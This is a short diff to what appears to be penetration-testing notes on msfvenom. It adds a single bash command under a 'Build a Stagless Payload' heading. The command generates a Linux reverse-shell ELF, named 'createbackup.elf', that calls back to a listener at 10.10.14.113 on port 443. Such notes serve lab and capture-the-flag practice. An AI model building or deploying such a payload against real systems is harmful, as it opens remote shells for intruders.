@@ -56,5 +56,6 @@ msfvenom -l payloads
 
 ### Build a Stagless Payload
 
-```
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
 ```
